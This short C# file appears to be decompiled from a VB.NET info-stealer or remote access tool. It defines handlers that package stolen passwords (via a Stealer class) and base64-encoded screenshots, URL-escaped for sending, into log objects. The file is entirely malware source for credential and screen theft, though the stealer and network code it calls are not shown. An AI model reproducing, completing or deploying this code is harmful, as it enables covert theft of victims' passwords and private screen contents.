using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class OtherHandlers
{
	public static Logs.Log SendPasswords()
	{
		return new Logs.Log(Logs.LogType.Passwords, Stealer.Steal().ToJSON());
	}

	public static Logs.Log SendScreenshot()
	{
		return new Logs.Log(Logs.LogType.Screenshot, Cryptography.ImageToBase64(Screenshot.Snap(Settings.Quality)).Replace("+", "%2B"));
	}
}
